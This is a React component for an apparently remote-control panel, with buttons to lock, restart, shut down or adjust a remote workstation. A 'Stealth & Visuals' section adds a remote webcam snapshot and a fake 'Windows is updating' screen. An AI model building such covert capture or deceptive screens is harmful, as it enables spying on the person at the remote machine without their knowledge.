import { useState, useEffect } from 'react'
import './ActionsManager.css'

const SYSTEM_ACTIONS = [
  { id: 'lock', label: 'Lock Screen', icon: '🔒', description: 'Instantly lock the remote workstation' },
  { id: 'logout', label: 'Log Out', icon: '👤', description: 'End the current user session', danger: true },
  { id: 'restart', label: 'Restart', icon: '🔄', description: 'Reboot the remote machine', danger: true },
  { id: 'shutdown', label: 'Shutdown', icon: '🛑', description: 'Power off the remote machine', danger: true },
  { id: 'sleep', label: 'Sleep', icon: '🌙', description: 'Put the machine into low-power mode' },
  { id: 'show_desktop', label: 'Show Desktop', icon: '🖼️', description: 'Minimize all windows' },
  { id: 'empty_recycle_bin', label: 'Empty Bin', icon: '🗑️', description: 'Clear the Recycle Bin' },
  { id: 'monitor_off', label: 'Monitor Off', icon: '💡', description: 'Turn off the screen (power save)' },
]

const VOLUME_ACTIONS = [
  { id: 'mute', label: 'Mute / Unmute', icon: '🔇' },
  { id: 'vol_down', label: 'Volume Down', icon: '🔉' },
  { id: 'vol_up', label: 'Volume Up', icon: '🔊' },
]

const BRIGHTNESS_ACTIONS = [
  { id: 'brightness_down', label: 'Dimmer', icon: '🔆' },
  { id: 'brightness_up', label: 'Brighter', icon: '☀️' },
]

export default function ActionsManager({ sendMessage, lastMessage }) {
  const [confirming, setConfirming] = useState(null)
  const [snapLoading, setSnapLoading] = useState(false)
  const [snapError, setSnapError] = useState(null)
  const [privacyActive, setPrivacyActive] = useState(() => {
    // Session-specific persistence for privacy mode
    const sessionId = window.location.pathname.split('/').pop()
    return localStorage.getItem(`sc_privacy_${sessionId}`) === 'true'
  })

  // Clear loading state when response arrives
  useEffect(() => {
    if (lastMessage?.type === 'camera_snapshot_response') {
      setSnapLoading(false)
      if (!lastMessage.success) {
        setSnapError(lastMessage.error)
      }
    }
  }, [lastMessage])

  const handleAction = (actionId, isDanger) => {
    if (isDanger && confirming !== actionId) {
      setConfirming(actionId)
      return
    }
    setConfirming(null)
    sendMessage({ type: 'system_action', action: actionId })
  }

  const takeSnapshot = () => {
    setSnapLoading(true)
    setSnapError(null)
    sendMessage({ type: 'camera_snapshot_request' })
  }

  const togglePrivacy = () => {
    const newVal = !privacyActive
    const sessionId = window.location.pathname.split('/').pop()
    setPrivacyActive(newVal)
    localStorage.setItem(`sc_privacy_${sessionId}`, newVal)
    sendMessage({ type: 'privacy_screen', enabled: newVal })
  }

  return (
    <div className="actions-manager fade-in">
      {/* Camera & Privacy Section */}
      <div className="actions-section">
        <h3 className="section-title">🕵️ Stealth & Visuals</h3>
        <div className="actions-grid">
          <div className="action-card camera-card" onClick={takeSnapshot}>
            <div className="action-icon">📸</div>
            <div className="action-info">
              <h4>Take Snapshot</h4>
              <p>Capture frame from remote webcam</p>
            </div>
            {snapLoading && <div className="loader-small" />}
          </div>

          <div 
            className={`action-card privacy-card ${privacyActive ? 'active-privacy' : ''}`} 
            onClick={togglePrivacy}
          >
            <div className="action-icon">{privacyActive ? '🔓' : '🔒'}</div>
            <div className="action-info">
              <h4>{privacyActive ? 'Disable Privacy Screen' : 'Enable Privacy Screen'}</h4>
              <p>{privacyActive ? 'End the fake Windows Update' : 'Show fake "Windows is updating" screen'}</p>
            </div>
          </div>
        </div>
        {snapError && <div className="action-error">⚠️ {snapError}</div>}
      </div>

      {/* System Power & State */}
      <div className="actions-section">
        <h3 className="section-title">🖥️ System State</h3>
        <div className="actions-grid">
          {SYSTEM_ACTIONS.map(action => (
            <div 
              key={action.id} 
              className={`action-card ${action.danger ? 'danger-card' : ''} ${confirming === action.id ? 'confirming' : ''}`}
              onClick={() => handleAction(action.id, action.danger)}
            >
              <div className="action-icon">{action.icon}</div>
              <div className="action-info">
                <h4>{confirming === action.id ? 'Are you sure?' : action.label}</h4>
                <p>{confirming === action.id ? 'Click again to confirm' : action.description}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Media Controls */}
      <div className="actions-section">
        <h3 className="section-title">🔊 Media & Display</h3>
        <div className="controls-row">
            <div className="control-group">
                <span className="control-label">Audio</span>
                <div className="btn-group">
                    {VOLUME_ACTIONS.map(a => (
                        <button key={a.id} className="btn-icon" onClick={() => handleAction(a.id)} title={a.label}>
                            {a.icon}
                        </button>
                    ))}
                </div>
            </div>
            <div className="control-group">
                <span className="control-label">Brightness</span>
                <div className="btn-group">
                    {BRIGHTNESS_ACTIONS.map(a => (
                        <button key={a.id} className="btn-icon" onClick={() => handleAction(a.id)} title={a.label}>
                            {a.icon}
                        </button>
                    ))}
                </div>
            </div>
        </div>
      </div>
    </div>
  )
}
